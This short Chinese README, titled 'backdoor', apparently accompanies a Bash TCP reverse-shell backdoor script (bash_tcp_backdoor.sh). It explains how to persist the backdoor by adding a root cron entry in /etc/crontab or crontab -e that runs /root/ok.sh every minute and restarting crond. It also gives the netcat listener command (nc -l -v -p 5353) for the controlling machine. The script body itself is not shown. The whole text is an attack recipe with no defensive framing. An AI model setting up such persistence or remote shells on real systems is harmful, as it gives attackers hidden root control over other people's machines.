# backdoor

Bash TCP反弹后门<br>
bash_tcp_backdoor.sh
vim /etc/crontab
*/1 * * * * root /root/ok.sh
或
crontab -e
*/1 * * * *  /root/ok.sh

systemctl restart crond

控制机执行
nc -l -v -p 5353
